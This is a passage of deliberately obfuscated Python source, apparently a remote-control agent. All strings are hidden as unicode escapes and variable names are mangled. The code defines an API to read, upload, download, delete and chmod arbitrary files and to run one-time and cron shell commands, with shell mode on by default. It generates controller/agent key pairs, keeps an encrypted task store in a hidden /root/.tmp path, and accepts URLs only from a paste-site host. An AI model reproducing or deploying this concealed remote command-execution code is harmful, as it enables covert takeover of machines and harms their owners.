    paths: List[str] = Field(..., description=codecs.decode('\\u8981\\u67e5\\u8be2\\u6743\\u9650\\u7684\\u6587\\u4ef6\\u002f\\u76ee\\u5f55\\u8def\\u5f84\\u5217\\u8868', 'unicode_escape'), examples=[[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0074\\u0065\\u0073\\u0074\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'), codecs.decode('\\u002f\\u0076\\u0061\\u0072\\u002f\\u006c\\u006f\\u0067', 'unicode_escape')]])

class AuthorityInfo(BaseModel):
    path: str
    name: str
    mode: str
    mode_octal: str
    type: str
    readable: bool
    writable: bool
    executable: bool
    mount_readonly: Optional[bool] = None

class AuthorityQueryResponse(SResponse):
    files: List[AuthorityInfo]

class AuthoritySetRequest(BaseModel):
    permissions: Dict[str, str] = Field(..., description=codecs.decode('\\u8def\\u5f84\\u5230\\u6743\\u9650\\u6a21\\u5f0f\\u7684\\u6620\\u5c04', 'unicode_escape'), examples=[{codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0074\\u0065\\u0073\\u0074\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'): codecs.decode('\\u0036\\u0034\\u0034', 'unicode_escape'), codecs.decode('\\u002f\\u006f\\u0070\\u0074\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u0073', 'unicode_escape'): codecs.decode('\\u0037\\u0035\\u0035', 'unicode_escape')}])
    recursive: bool = Field(False, description=codecs.decode('\\u662f\\u5426\\u9012\\u5f52\\u5e94\\u7528\\u5230\\u5b50\\u76ee\\u5f55', 'unicode_escape'), examples=[True, False])

class AuthorityResult(BaseModel):
    path: str
    requested: str
    applied: str
    mode_octal: str
    status: str

class AuthoritySetResponse(SResponse):
    total: int
    success: int
    results: List[AuthorityResult]

class FileCatRequest(BaseModel):
    path: str = Field(..., description=codecs.decode('\\u8981\\u67e5\\u770b\\u7684\\u6587\\u4ef6\\u8def\\u5f84', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067\\u002e\\u006a\\u0073\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u002f\\u0076\\u0061\\u0072\\u002f\\u006c\\u006f\\u0067\\u002f\\u0073\\u0079\\u0073\\u006c\\u006f\\u0067', 'unicode_escape')])

class FileCatResponse(SResponse):
    path: str
    content: str
    encoding: str
    is_binary: bool
    size: int

class FileUploadRequest(BaseModel):
    path: str = Field(..., description=codecs.decode('\\u4e0a\\u4f20\\u76ee\\u6807\\u76ee\\u5f55\\u6216\\u6587\\u4ef6\\u8def\\u5f84', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0075\\u0070\\u006c\\u006f\\u0061\\u0064\\u0073', 'unicode_escape'), codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006e\\u0065\\u0077\\u0066\\u0069\\u006c\\u0065\\u002e\\u0074\\u0078\\u0074', 'unicode_escape')])
    filename: Optional[str] = Field(None, description=codecs.decode('\\u6587\\u4ef6\\u540d\\u0020\\u0028\\u5f53\\u0070\\u0061\\u0074\\u0068\\u662f\\u76ee\\u5f55\\u65f6\\u5fc5\\u586b\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0062\\u0061\\u0063\\u006b\\u0075\\u0070\\u002e\\u0074\\u0061\\u0072\\u002e\\u0067\\u007a', 'unicode_escape')])
    content: str = Field(..., description=codecs.decode('\\u6587\\u4ef6\\u5185\\u5bb9\\u7684\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u7f16\\u7801', 'unicode_escape'), examples=[codecs.decode('\\u0053\\u0047\\u0056\\u0073\\u0062\\u0047\\u0038\\u0067\\u0056\\u0032\\u0039\\u0079\\u0062\\u0047\\u0051\\u0068', 'unicode_escape')])
    chunk_id: Optional[int] = Field(None, description=codecs.decode('\\u5206\\u5757\\u7d22\\u5f15\\u0020\\u0028\\u0030\\u002d\\u0062\\u0061\\u0073\\u0065\\u0064\\u0029', 'unicode_escape'), examples=[0])
    total_chunks: Optional[int] = Field(None, description=codecs.decode('\\u603b\\u5206\\u5757\\u6570', 'unicode_escape'), examples=[3])

class FileUploadRawResponse(SResponse):
    codecs.decode('\\u88f8\\u4e8c\\u8fdb\\u5236\\u6d41\\u4e0a\\u4f20\\u63a5\\u53e3\\u7684\\u6807\\u51c6\\u5316\\u7ed3\\u6784\\u4f53\\u8fd4\\u56de\\u4f53', 'unicode_escape')
    path: Optional[str] = Field(None, description=codecs.decode('\\u6587\\u4ef6\\u5728\\u670d\\u52a1\\u5668\\u7aef\\u7684\\u4fdd\\u5b58\\u8def\\u5f84', 'unicode_escape'))
    chunk_id: Optional[int] = Field(None, description=codecs.decode('\\u5f53\\u524d\\u4e0a\\u4f20\\u7684\\u5206\\u7247\\u7d22\\u5f15', 'unicode_escape'))
    completed: bool = Field(..., description=codecs.decode('\\u6307\\u793a\\u8be5\\u6587\\u4ef6\\u662f\\u5426\\u5df2\\u5168\\u90e8\\u4f20\\u8f93\\u5e76\\u5408\\u5e76\\u5b8c\\u6210', 'unicode_escape'))
    message: str = Field(codecs.decode('', 'unicode_escape'), description=codecs.decode('\\u72b6\\u6001\\u63d0\\u793a\\u6d88\\u606f', 'unicode_escape'))

class FileUploadResponse(SResponse):
    path: Optional[str] = None
    received: Optional[int] = None
    total: Optional[int] = None
    chunked: Optional[bool] = None

class FileDownloadRequest(BaseModel):
    path: str = Field(..., description=codecs.decode('\\u8981\\u4e0b\\u8f7d\\u7684\\u6587\\u4ef6\\u8def\\u5f84', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0062\\u0061\\u0063\\u006b\\u0075\\u0070\\u002e\\u0074\\u0061\\u0072\\u002e\\u0067\\u007a', 'unicode_escape')])

class FileDeleteRequest(BaseModel):
    paths: List[str] = Field(..., description=codecs.decode('\\u8981\\u5220\\u9664\\u7684\\u6587\\u4ef6\\u002f\\u76ee\\u5f55\\u8def\\u5f84\\u5217\\u8868', 'unicode_escape'), examples=[[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006f\\u006c\\u0064\\u002e\\u006c\\u006f\\u0067', 'unicode_escape'), codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u0063\\u0061\\u0063\\u0068\\u0065', 'unicode_escape')]])
    path: Optional[str] = Field(None, exclude=True)
    path2: Optional[str] = Field(None, exclude=True)

class FileDeleteResult(BaseModel):
    path: str
    status: str

class FileDeleteResponse(BaseModel):
    status: str
    results: List[FileDeleteResult]

class FileMoveRequest(BaseModel):
    move_map: Dict[str, str] = Field(..., description=codecs.decode('\\u6e90\\u8def\\u5f84\\u5230\\u76ee\\u6807\\u8def\\u5f84\\u7684\\u6620\\u5c04', 'unicode_escape'), examples=[{codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'): codecs.decode('\\u002f\\u0061\\u0072\\u0063\\u0068\\u0069\\u0076\\u0065\\u002f\\u006f\\u006c\\u0064\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'), codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006c\\u006f\\u0067\\u0073', 'unicode_escape'): codecs.decode('\\u002f\\u0062\\u0061\\u0063\\u006b\\u0075\\u0070\\u002f\\u006c\\u006f\\u0067\\u0073', 'unicode_escape')}])
    path: Optional[str] = Field(None, exclude=True)
    mvpath: Optional[str] = Field(None, exclude=True)

class FileMoveResult(BaseModel):
    from_field: str = Field(..., alias=codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'))
    to: str
    status: str
    error: Optional[str] = None
    model_config = ConfigDict(populate_by_name=True)

class FileMoveResponse(BaseModel):
    status: str
    total: int
    success: int
    message: Optional[str] = None
    results: List[Dict[str, str]]

class FileMkdirRequest(BaseModel):
    path: str = Field(..., description=codecs.decode('\\u8981\\u521b\\u5efa\\u7684\\u65b0\\u76ee\\u5f55\\u8def\\u5f84', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070\\u002f\\u006e\\u0065\\u0077\\u002f\\u0070\\u0072\\u006f\\u006a\\u0065\\u0063\\u0074\\u002f\\u006c\\u006f\\u0067\\u0073', 'unicode_escape')])

class FileMkdirResponse(BaseModel):
    status: str
    path: str

class FileZipRequest(BaseModel):
    path: str = Field(..., description=codecs.decode('\\u76ee\\u6807\\u0020\\u007a\\u0069\\u0070\\u0020\\u8def\\u5f84\\u003b\\u0020\\u7236\\u76ee\\u5f55\\u81ea\\u52a8\\u521b\\u5efa\\u002c\\u0020\\u5df2\\u5b58\\u5728\\u65f6\\u8986\\u76d6\\u91cd\\u5efa', 'unicode_escape'))
    items: Optional[List[str]] = Field(None, description=codecs.decode('\\u5f85\\u538b\\u7f29\\u6587\\u4ef6\\u002f\\u76ee\\u5f55\\u5217\\u8868\\u003b\\u0020\\u76ee\\u5f55\\u9012\\u5f52\\u6253\\u5305\\u003b\\u0020\\u5355\\u9879\\u5931\\u8d25\\u4e0d\\u4e2d\\u65ad', 'unicode_escape'))
    flat: bool = Field(False, description=codecs.decode('\\u0054\\u0072\\u0075\\u0065\\u0020\\u65f6\\u76ee\\u5f55\\u5185\\u5bb9\\u4e0d\\u5e26\\u9876\\u5c42\\u76ee\\u5f55\\u540d\\u524d\\u7f00', 'unicode_escape'))

class FileZipItemResult(BaseModel):
    item: str
    status: str
    added: int = 0
    error: Optional[str] = None
    reason: Optional[str] = None

class FileZipResponse(BaseModel):
    status: str
    path: str
    entries: int
    size: int
    results: List[FileZipItemResult]

class FileUnzipRequest(BaseModel):
    path: str = Field(..., description=codecs.decode('\\u007a\\u0069\\u0070\\u0020\\u538b\\u7f29\\u5305\\u8def\\u5f84\\u0020\\u0028\\u5b89\\u5168\\u6c99\\u7bb1\\u5185\\u0029', 'unicode_escape'))
    dest_path: Optional[str] = Field(None, description=codecs.decode('\\u89e3\\u538b\\u76ee\\u6807\\u76ee\\u5f55\\u002c\\u0020\\u7f3a\\u7701\\u4e3a\\u0020\\u007a\\u0069\\u0070\\u0020\\u6240\\u5728\\u76ee\\u5f55\\u003b\\u0020\\u76ee\\u5f55\\u4e0d\\u5b58\\u5728\\u81ea\\u52a8\\u521b\\u5efa', 'unicode_escape'))
    overwrite: bool = Field(True, description=codecs.decode('\\u76ee\\u6807\\u6587\\u4ef6\\u5df2\\u5b58\\u5728\\u65f6\\u662f\\u5426\\u8986\\u76d6\\u002c\\u0020\\u9ed8\\u8ba4\\u0020\\u0074\\u0072\\u0075\\u0065\\u003b\\u0020\\u0066\\u0061\\u006c\\u0073\\u0065\\u0020\\u65f6\\u8df3\\u8fc7\\u5e76\\u8ba1\\u5165\\u0020\\u0073\\u006b\\u0069\\u0070\\u0070\\u0065\\u0064', 'unicode_escape'))
    entries: Optional[List[str]] = Field(None, description=codecs.decode('\\u4ec5\\u89e3\\u538b\\u5339\\u914d\\u6761\\u76ee\\u0020\\u0028\\u7cbe\\u786e\\u540d\\u6216\\u4e0d\\u5e26\\u8def\\u5f84\\u5339\\u914d\\u0029\\u002c\\u0020\\u7f3a\\u7701\\u89e3\\u538b\\u5168\\u90e8', 'unicode_escape'))

class FileUnzipResponse(BaseModel):
    status: str
    path: str
    dest: str
    extracted: int
    skipped: int
    files: List[str]
    files_truncated: bool

class OneTimeTaskGetResponse(BaseModel):
    status: str = Field(codecs.decode('\\u006f\\u006b', 'unicode_escape'), description=codecs.decode('\\u8bf7\\u6c42\\u72b6\\u6001', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape')])
    count: int = Field(..., description=codecs.decode('\\u5f85\\u6267\\u884c\\u4efb\\u52a1\\u7684\\u6570\\u91cf', 'unicode_escape'), examples=[2])
    tasks: List[str] = Field(..., description=codecs.decode('\\u5f85\\u6267\\u884c\\u7684\\u4efb\\u52a1\\u547d\\u4ee4\\u5217\\u8868', 'unicode_escape'), examples=[[codecs.decode('\\u0065\\u0063\\u0068\\u006f\\u0020\\u0027\\u0069\\u006e\\u0069\\u0074\\u0027', 'unicode_escape'), codecs.decode('\\u002f\\u006f\\u0070\\u0074\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u0073\\u002f\\u0073\\u0065\\u0074\\u0075\\u0070\\u002e\\u0073\\u0068', 'unicode_escape')]])

class OneTimeTaskRequest(RootModel):
    root: List[str]

class OneTimeTaskResponse(CountResponse):
    tasks: List[str]
    executed: Optional[List[Any]] = None
    persisted: Optional[bool] = Field(None, description=codecs.decode('\\u662f\\u5426\\u5df2\\u6301\\u4e45\\u5316\\u843d\\u76d8\\u0020\\u0028\\u0064\\u006f\\u0063\\u0073\\u002f\\u0041\\u0050\\u0049\\u002e\\u004d\\u0044\\u0020\\u5341\\u4e09\\u0029', 'unicode_escape'), examples=[True])

class CronTasksResponse(CountResponse):
    tasks: Dict[str, str] = Field(..., description=codecs.decode('\\u0043\\u0072\\u006f\\u006e\\u8868\\u8fbe\\u5f0f\\u4e0e\\u547d\\u4ee4\\u7684\\u6620\\u5c04\\u5b57\\u5178', 'unicode_escape'), examples=[{codecs.decode('\\u002a\\u002f\\u0031\\u0030\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a', 'unicode_escape'): codecs.decode('\\u0070\\u0079\\u0074\\u0068\\u006f\\u006e\\u0020\\u002f\\u006f\\u0070\\u0074\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u0073\\u002f\\u0068\\u0065\\u0061\\u006c\\u0074\\u0068\\u005f\\u0063\\u0068\\u0065\\u0063\\u006b\\u002e\\u0070\\u0079', 'unicode_escape')}])
    persisted: Optional[bool] = Field(None, description=codecs.decode('\\u662f\\u5426\\u5df2\\u6301\\u4e45\\u5316\\u843d\\u76d8\\u0020\\u0028\\u0064\\u006f\\u0063\\u0073\\u002f\\u0041\\u0050\\u0049\\u002e\\u004d\\u0044\\u0020\\u5341\\u4e09\\u0029', 'unicode_escape'), examples=[True])

class BaseLogEntry(BaseModel):
    ts: str = Field(..., description=codecs.decode('\\u6267\\u884c\\u65f6\\u95f4\\u6233', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0034\\u002d\\u0030\\u0031\\u002d\\u0031\\u0035\\u0054\\u0031\\u0030\\u003a\\u0033\\u0030\\u003a\\u0034\\u0035\\u005a', 'unicode_escape')])
    cmd: str = Field(..., description=codecs.decode('\\u6267\\u884c\\u7684\\u547d\\u4ee4', 'unicode_escape'))
    output: str = Field(..., description=codecs.decode('\\u547d\\u4ee4\\u8f93\\u51fa\\u5185\\u5bb9', 'unicode_escape'))
    exitcode: int = Field(..., description=codecs.decode('\\u9000\\u51fa\\u7801', 'unicode_escape'))
    type: str = Field(..., description=codecs.decode('\\u65e5\\u5fd7\\u7c7b\\u578b', 'unicode_escape'))
    formatted: Optional[str] = Field(None, description=codecs.decode('\\u683c\\u5f0f\\u5316\\u540e\\u7684\\u6458\\u8981', 'unicode_escape'))

class CronLogEntry(BaseLogEntry):
    cron: str = Field(..., description=codecs.decode('\\u0043\\u0072\\u006f\\u006e\\u0020\\u8868\\u8fbe\\u5f0f', 'unicode_escape'), examples=[codecs.decode('\\u002a\\u002f\\u0035\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a\\u0020\\u002a', 'unicode_escape')])

class TaskLogResponse(CountResponse):
    logs: List[Any]

class LogClearResponse(SResponse):
    cleared: str = Field(..., description=codecs.decode('\\u88ab\\u6e05\\u7a7a\\u7684\\u65e5\\u5fd7\\u7c7b\\u578b', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006e\\u0065\\u0074\\u0069\\u006d\\u0065', 'unicode_escape'), codecs.decode('\\u0063\\u0072\\u006f\\u006e', 'unicode_escape')])

class LogStats(BaseModel):
    total_logged: int
    max_capacity: int
    recent_success: int
    recent_failed: int

class LogSummaryResponse(BaseModel):
    onetime: LogStats
    cron: LogStats

class OnetimeStatus(BaseModel):
    pending: bool = Field(..., description=codecs.decode('\\u662f\\u5426\\u6709\\u5f85\\u6267\\u884c\\u7684\\u4efb\\u52a1', 'unicode_escape'), examples=[False])
    count: int = Field(..., description=codecs.decode('\\u5f85\\u6267\\u884c\\u4efb\\u52a1\\u6570\\u91cf', 'unicode_escape'), examples=[3])

class CronStatus(BaseModel):
    active: bool = Field(..., description=codecs.decode('\\u5b9a\\u65f6\\u4efb\\u52a1\\u8c03\\u5ea6\\u5668\\u662f\\u5426\\u5904\\u4e8e\\u6d3b\\u8dc3\\u72b6\\u6001', 'unicode_escape'), examples=[True])
    count: int = Field(..., description=codecs.decode('\\u5f53\\u524d\\u914d\\u7f6e\\u7684\\u5b9a\\u65f6\\u4efb\\u52a1\\u6570\\u91cf', 'unicode_escape'), examples=[2])
    check_interval: int = Field(..., description=codecs.decode('\\u68c0\\u67e5\\u95f4\\u9694\\u0028\\u79d2\\u0029', 'unicode_escape'), examples=[30])

class TaskPersistenceStatus(BaseModel):
    enabled: bool = Field(..., description=codecs.decode('\\u4efb\\u52a1\\u6301\\u4e45\\u5316\\u662f\\u5426\\u542f\\u7528\\u0020\\u0028\\u004b\\u0053\\u0054\\u004f\\u0052\\u0045\\u005f\\u004b\\u0045\\u0059\\u002f\\u004b\\u0053\\u0054\\u004f\\u0052\\u0045\\u0029', 'unicode_escape'), examples=[True])
    store_path: Optional[str] = Field(None, description=codecs.decode('\\u52a0\\u5bc6\\u5b58\\u50a8\\u6587\\u4ef6\\u8def\\u5f84', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0072\\u006f\\u006f\\u0074\\u002f\\u002e\\u0074\\u006d\\u0070\\u002f\\u0073\\u0074\\u006f\\u0072\\u0065\\u002e\\u0065\\u006e\\u0063', 'unicode_escape')])
    last_saved_at: Optional[str] = Field(None, description=codecs.decode('\\u6700\\u8fd1\\u4e00\\u6b21\\u6210\\u529f\\u843d\\u76d8\\u65f6\\u95f4\\u0020\\u0028\\u0055\\u0054\\u0043\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0036\\u002d\\u0030\\u0039\\u002d\\u0032\\u0035\\u0054\\u0031\\u0030\\u003a\\u0033\\u0030\\u003a\\u0034\\u0035\\u005a', 'unicode_escape')])

class TaskStatusResponse(BaseModel):
    onetime: OnetimeStatus
    cron: CronStatus
    persistence: TaskPersistenceStatus

class OnetimeExecuteResponse(BaseModel):
    status: str = Field(codecs.decode('\\u006f\\u006b', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape')])
    message: Optional[str] = Field(None, description=codecs.decode('\\u72b6\\u6001\\u8bf4\\u660e', 'unicode_escape'))
    executed: int = Field(..., description=codecs.decode('\\u6210\\u529f\\u89e6\\u53d1\\u7684\\u4efb\\u52a1\\u6570\\u91cf', 'unicode_escape'), examples=[2])
    results: List[Dict[str, Any]] = Field(..., description=codecs.decode('\\u6bcf\\u4e2a\\u4efb\\u52a1\\u7684\\u8be6\\u7ec6\\u6267\\u884c\\u7ed3\\u679c', 'unicode_escape'), examples=[[{codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): codecs.decode('\\u0065\\u0063\\u0068\\u006f\\u0020\\u0027\\u0068\\u0065\\u006c\\u006c\\u006f\\u0027', 'unicode_escape'), codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): 0, codecs.decode('\\u0073\\u0074\\u0064\\u006f\\u0075\\u0074', 'unicode_escape'): codecs.decode('\\u0068\\u0065\\u006c\\u006c\\u006f\\u000a', 'unicode_escape'), codecs.decode('\\u0073\\u0074\\u0064\\u0065\\u0072\\u0072', 'unicode_escape'): codecs.decode('', 'unicode_escape')}]])
_BASE_DIR = os.path.dirname(os.path.abspath(__file__))

def _get_config_value(key: str, default: str=codecs.decode('', 'unicode_escape'), file_path: str=None) -> str:
    O0_var_34 = os.getenv(key)
    if O0_var_34 is not None:
        return O0_var_34.strip()
    if file_path:
        O0_var_35 = os.path.join(_BASE_DIR, file_path)
        if os.path.exists(O0_var_35):
            try:
                with open(O0_var_35, codecs.decode('\\u0072', 'unicode_escape'), encoding=codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')) as O0_var_36:
                    O0_var_37 = O0_var_36.read().strip()
                    if O0_var_37:
                        return O0_var_37
            except Exception:
                pass
    return default.strip() if default else codecs.decode('', 'unicode_escape')

@dataclass
class NoiseKeypair:
    codecs.decode('\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u534f\\u8bae\\u5bc6\\u94a5\\u5bf9\\u6570\\u636e\\u7c7b', 'unicode_escape')
    role: str
    private_b64: str
    public_b64: str

    def to_dict(self) -> Dict[str, str]:
        return asdict(self)

    @property
    def private_bytes(self) -> bytes:
        return base64.b64decode(self.private_b64)

    @property
    def public_bytes(self) -> bytes:
        return base64.b64decode(self.public_b64)

class NoiseKeyGenerator:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0063\\u006f\\u006c\\u0020\\u0058\\u0032\\u0035\\u0035\\u0031\\u0039\\u0020\\u5bc6\\u94a5\\u5bf9\\u751f\\u6210\\u5668\\u000a\\u0020\\u0020\\u0020\\u0020\\u000a\\u0020\\u0020\\u0020\\u0020\\u751f\\u6210\\u7b26\\u5408\\u0020\\u006e\\u006f\\u0069\\u0073\\u0065\\u002d\\u0063\\u0020\\u002f\\u0020\\u006e\\u006f\\u0069\\u0073\\u0065\\u0070\\u0072\\u006f\\u0074\\u006f\\u0063\\u006f\\u006c\\u0020\\u6807\\u51c6\\u7684\\u0020\\u0033\\u0032\\u0020\\u5b57\\u8282\\u0020\\u0052\\u0061\\u0077\\u0020\\u683c\\u5f0f\\u5bc6\\u94a5\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')
    KEY_SIZE = 32
    ENCODING = serialization.Encoding.Raw
    PRIVATE_FORMAT = serialization.PrivateFormat.Raw
    PUBLIC_FORMAT = serialization.PublicFormat.Raw

    @staticmethod
    def _generate_raw_keypair() -> Tuple[bytes, bytes]:
        O0_var_38 = x25519.X25519PrivateKey.generate()
        O0_var_39 = O0_var_38.public_key()
        O0_var_40 = O0_var_38.private_bytes(encoding=NoiseKeyGenerator.ENCODING, format=NoiseKeyGenerator.PRIVATE_FORMAT, encryption_algorithm=serialization.NoEncryption())
        O0_var_41 = O0_var_39.public_bytes(encoding=NoiseKeyGenerator.ENCODING, format=NoiseKeyGenerator.PUBLIC_FORMAT)
        assert len(O0_var_40) == NoiseKeyGenerator.KEY_SIZE
        assert len(O0_var_41) == NoiseKeyGenerator.KEY_SIZE
        return (O0_var_40, O0_var_41)

    @classmethod
    def generate_single(cls, role_name: str) -> NoiseKeypair:
        O0_var_42, O0_var_43 = cls._generate_raw_keypair()
        return NoiseKeypair(role=role_name, private_b64=base64.b64encode(O0_var_42).decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')), public_b64=base64.b64encode(O0_var_43).decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')))

    @classmethod
    def generate_pair(cls, control_role: str=codecs.decode('\\u0043\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u006c\\u0065\\u0072', 'unicode_escape'), agent_role: str=codecs.decode('\\u0041\\u0067\\u0065\\u006e\\u0074', 'unicode_escape')) -> Dict[str, NoiseKeypair]:
        return {codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape'): cls.generate_single(control_role), codecs.decode('\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'): cls.generate_single(agent_role)}

def O0_fn_1(O0_var_44):
    O0_var_45 = (O0_var_44 or codecs.decode('', 'unicode_escape')).strip()
    O0_var_46 = O0_var_45.replace(codecs.decode('\\u0009', 'unicode_escape'), codecs.decode('', 'unicode_escape')).replace(codecs.decode('\\u000d', 'unicode_escape'), codecs.decode('', 'unicode_escape')).replace(codecs.decode('\\u000a', 'unicode_escape'), codecs.decode('', 'unicode_escape'))
    O0_var_47 = re.match(codecs.decode('\\u005e\\u005b\\u0041\\u002d\\u005a\\u0061\\u002d\\u007a\\u005d\\u005b\\u0041\\u002d\\u005a\\u0061\\u002d\\u007a\\u0030\\u002d\\u0039\\u002b\\u002e\\u002d\\u005d\\u002a\\u003a\\u0028\\u002e\\u002a\\u0029\\u0024', 'unicode_escape'), O0_var_46, re.DOTALL)
    if not O0_var_47:
        return False
    O0_var_48 = O0_var_47.group(1)
    if O0_var_48.startswith(codecs.decode('\\u002f\\u002f', 'unicode_escape')):
        O0_var_48 = O0_var_48[2:]
    O0_var_49 = re.match(codecs.decode('\\u0028\\u005b\\u005e\\u002f\\u003f\\u0023\\u005c\\u005c\\u005d\\u002a\\u0029\\u0028\\u002e\\u002a\\u0029\\u0024', 'unicode_escape'), O0_var_48, re.DOTALL)
    if not O0_var_49:
        return False
    O0_var_50, O0_var_51 = O0_var_49.groups()
    O0_var_52 = O0_var_50.rsplit(codecs.decode('\\u0040', 'unicode_escape'), 1)[-1]
    O0_var_53 = O0_var_52.split(codecs.decode('\\u003a', 'unicode_escape'), 1)[0].strip().lower()
    if O0_var_53 != codecs.decode('\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c', 'unicode_escape'):
        return False
    return O0_var_51.startswith(codecs.decode('\\u002f\\u007e', 'unicode_escape')) or (codecs.decode('\\u005c', 'unicode_escape') in O0_var_51 and codecs.decode('\\u002f\\u007e', 'unicode_escape') in O0_var_51)

class Config:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u914d\\u7f6e\\u4e2d\\u5fc3\\u0020\\u002d\\u0020\\u652f\\u6301\\u591a\\u7ea7\\u914d\\u7f6e\\u6e90\\u000a\\u0020\\u0020\\u0020\\u0020\\u4f18\\u5148\\u7ea7\\u003a\\u0020\\u73af\\u5883\\u53d8\\u91cf\\u0020\\u003e\\u0020\\u672c\\u5730\\u6587\\u4ef6\\u0020\\u003e\\u0020\\u9ed8\\u8ba4\\u503c\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')
    Rtimeout = int(os.getenv(codecs.decode('\\u0045\\u0058\\u0045\\u0043\\u005f\\u0054\\u0049\\u004d\\u0045\\u004f\\u0055\\u0054', 'unicode_escape'), codecs.decode('\\u0033\\u0030', 'unicode_escape')))
    EXEC_SHELL_MODE = os.getenv(codecs.decode('\\u0045\\u0058\\u0045\\u0043\\u005f\\u0053\\u0048\\u0045\\u004c\\u004c', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')).lower() == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
    DEBUG = os.getenv(codecs.decode('\\u0044\\u0045\\u0042\\u0055\\u0047', 'unicode_escape'), codecs.decode('\\u0066\\u0061\\u006c\\u0073\\u0065', 'unicode_escape')).lower() == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
    TIMESTAMP_WINDOW = int(os.getenv(codecs.decode('\\u0054\\u0049\\u004d\\u0045\\u0053\\u0054\\u0041\\u004d\\u0050\\u005f\\u0057\\u0049\\u004e\\u0044\\u004f\\u0057', 'unicode_escape'), codecs.decode('\\u0033\\u0036\\u0030\\u0030', 'unicode_escape')))
    ECDSA_PUBLIC_KEY_PEM = _get_config_value(key=codecs.decode('\\u0045\\u0043\\u0044\\u0053\\u0041\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059', 'unicode_escape'), file_path=codecs.decode('\\u006b\\u0065\\u0079\\u0073\\u002f\\u0061\\u0067\\u0065\\u006e\\u0074\\u005f\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0075\\u0062\\u002e\\u0070\\u0065\\u006d', 'unicode_escape')) or codecs.decode('\\u0045\\u0043\\u0044\\u0053\\u0041\\u516c\\u94a5\\u5185\\u5bb9', 'unicode_escape')
    ECIES_PUBLIC_KEY_PEM = _get_config_value(key=codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u005f\\u0050\\u0055\\u0042\\u004b\\u0045\\u0059', 'unicode_escape'), file_path=codecs.decode('\\u006b\\u0065\\u0079\\u0073\\u002f\\u0061\\u0067\\u0065\\u006e\\u0074\\u005f\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062\\u002e\\u0062\\u0036\\u0034', 'unicode_escape')) or codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u516c\\u94a5\\u5185\\u5bb9', 'unicode_escape')
    _raw_key = get_random_bytes(32)
    SESSION_KEY = base64.b64encode(_raw_key).decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
    keys = NoiseKeyGenerator.generate_pair()
